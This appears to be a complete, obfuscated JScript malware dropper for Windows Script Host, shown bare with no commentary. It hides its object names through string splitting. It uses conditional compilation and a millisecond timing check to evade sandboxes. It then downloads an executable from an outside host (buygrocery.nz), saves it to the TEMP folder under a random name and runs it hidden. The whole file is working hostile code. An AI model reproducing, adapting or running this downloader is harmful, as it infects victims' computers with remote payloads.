var T1 = false;
var ZD = "Create"+"Object";
var EU = function RD() {return WScript[ZD]("WScript"+".Shell");}(), K = 11;
var N1 = "MSXML2"+".XMLHTTP";
var V = 2;
var R = V - 2;
function Z(EJ){EU["Run"](EJ, R, R);};
function T(){return N1 + "";};
function F(UH, AM){R = R * 1; return UH - AM;};
function A(){return ZD;};
/*@cc_on
  @if (@_win32 || @_win64)
    T1 = true;
  @end
@*/
if (T1)
{
var F0 = "";
function U(){return 22;};
var AJ = 0; var T0 = 0;
function N0()
{
var U1 = new this["Date"]();
var P = U1["getUTCMilliseconds"]();
WScript["Sleep"](U());
var U1 = new this["Date"]();
var NT = U1["getUTCMilliseconds"]();
WScript["Sleep"](U());
var U1 = new this["Date"]();
var A0 = U1["getUTCMilliseconds"]();
var AJ = "SS";
AJ = F(NT, P);
var T0 = "JV0";
T0 = F(A0, NT);
F0 = "open";
return F(AJ, T0);
}
var C = false;
var HT = false;
for (var B = R; B < U() * 1; B++){if (N0() != R){
C = true; 
T0 = "31" + 11 * AJ + T0; 
HT = true; 
break;
}}
function WN() {return ((C == true) && (C == HT)) ? 1 : R;};
if (C && WN() && HT){
function OI() {return EU["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "x5WduBU02Vb1.ex" + "e";};
 AO = T();
 WC = WScript[ZD](AO);
 var H = 1;
do { 
	for (;H;){
	try {
		if (H == 1)
		{
			WC[F0]("GET", "http://buygrocery.nz/l7dsp", false);
			WC["send"]();
			I = "Sleep";
			H = 2;
		}
		WScript[I](U() + 120); 
		if (WC["readystate"] < 2 * 2) continue;
		H = R;
		function N(U0) {var KF = (1, 2, 3, 4, 5, U0); return KF;};
		X = WScript[A()]("ADODB.Stream");
		AO = X;
		AO[F0]();
		AO["type"] = N(1);
		AO["write"](WC["ResponseBody"]);
		X["position"] = N(R);
		AO["Save" + "ToFile"](OI(), 2);
		X["cl"+"ose"]();
		JV = OI();
		Z(JV);
	} catch(UO){};};
}while (H);
}
}

